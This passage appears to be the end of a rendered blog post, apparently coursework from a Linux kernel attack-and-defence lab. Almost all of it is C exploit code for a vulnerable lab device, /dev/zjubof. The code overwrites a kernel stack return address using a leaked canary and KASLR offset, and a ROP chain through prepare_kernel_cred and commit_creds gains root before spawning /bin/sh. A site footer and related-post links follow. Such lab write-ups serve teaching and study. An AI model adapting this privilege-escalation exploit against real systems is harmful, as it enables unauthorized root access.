+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>hackUsingFirstLevelGadget</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>offset</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>49</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;0123456789ABCDEF</span><span class=se>\x30</span><span class=s>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>newRA</span> <span class=o>=</span> <span class=n>RAToFirstLevelGadget</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>24</span><span class=p>,</span> <span class=n>canaryStr</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>32</span><span class=p>,</span> <span class=n>oldFPStr</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>40</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>newRA</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>48</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>hackUsingROP</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>offset</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>161</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>24</span><span class=p>,</span> <span class=n>canaryStr</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>prepareKernelCredRA</span> <span class=o>=</span> <span class=n>RAOfPrepareKernelCred</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>40</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>prepareKernelCredRA</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>commitCredsRA</span> <span class=o>=</span> <span class=n>RAOfCommitCreds</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>72</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>commitCredsRA</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>secondLevelGadgetRA</span> <span class=o>=</span> <span class=n>RAOfSecondLevelGadget</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>104</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>secondLevelGadgetRA</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>ZJUBofWriteRA</span> <span class=o>=</span> <span class=n>RAOfZJUBofWrite</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>152</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>ZJUBofWriteRA</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>160</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>   
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/zjubof&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>offset</span> <span class=o>=</span> <span class=nf>getOffset</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>hackUsingFirstLevelGadget</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>offset</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// hackUsingROP(fd, offset);
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><blockquote><p>Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.</p></blockquote></section><footer class=article-footer><section class=article-tags><a href=/tags/security/>Security</a>
+<a href=/tags/technology/>Technology</a>
+<a href=/tags/linux/>Linux</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/jop/><div class=article-image><img src=/p/jop/cover.20bec5e323b5728a9d1698d32f72ae16_hu5b167a362bf183fa776f2ef90b695ed1_16596_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post JOP | Linux内核攻防" data-key=JOP data-hash="md5-IL7F4yO1coqdFpjTL3KuFg=="></div><div class=article-details><h2 class=article-title>JOP | Linux内核攻防</h2></div></a></article><article class=has-image><a href=/p/rust-cs110l-notes-3/><div class=article-image><img src=/p/rust-cs110l-notes-3/cover.1e68e45352544118b3811ec10fd897d5_hu5f8d5b24f629f61bf6061899af2962f9_20586_250x150_fill_box_smart1_3.png width=250 height=150 loading=lazy alt="Featured image of post Stanford CS110L Notes 3" data-key=rust-cs110l-notes-3 data-hash="md5-HmjkU1JUQRizgR7BD9iX1Q=="></div><div class=article-details><h2 class=article-title>Stanford CS110L Notes 3</h2></div></a></article><article class=has-image><a href=/p/rust-cs110l-notes-2/><div class=article-image><img src=/p/rust-cs110l-notes-2/cover.1e68e45352544118b3811ec10fd897d5_hu5f8d5b24f629f61bf6061899af2962f9_20586_250x150_fill_box_smart1_3.png width=250 height=150 loading=lazy alt="Featured image of post Stanford CS110L Notes 2" data-key=rust-cs110l-notes-2 data-hash="md5-HmjkU1JUQRizgR7BD9iX1Q=="></div><div class=article-details><h2 class=article-title>Stanford CS110L Notes 2</h2></div></a></article><article class=has-image><a href=/p/rust-cs110l-notes-1/><div class=article-image><img src=/p/rust-cs110l-notes-1/cover.1e68e45352544118b3811ec10fd897d5_hu5f8d5b24f629f61bf6061899af2962f9_20586_250x150_fill_box_smart1_3.png width=250 height=150 loading=lazy alt="Featured image of post Stanford CS110L Notes 1" data-key=rust-cs110l-notes-1 data-hash="md5-HmjkU1JUQRizgR7BD9iX1Q=="></div><div class=article-details><h2 class=article-title>Stanford CS110L Notes 1</h2></div></a></article><article class=has-image><a href=/p/cpp-stl-iterator-and-function-object/><div class=article-image><img src=/p/cpp-stl-iterator-and-function-object/cover.bf953ed90bccb82e12fee7184a53dc67_hu6170f1f82b3711c204643e7d26f97db9_36645_250x150_fill_box_smart1_3.png width=250 height=150 loading=lazy alt="Featured image of post （转载）理解 STL——迭代器和函数对象" data-key=cpp-STL-iterator-and-function-object data-hash="md5-v5U+2QvMuC4S/ucYSlPcZw=="></div><div class=article-details><h2 class=article-title>（转载）理解 STL——迭代器和函数对象</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2023 Jiacheng Hu</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.16.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
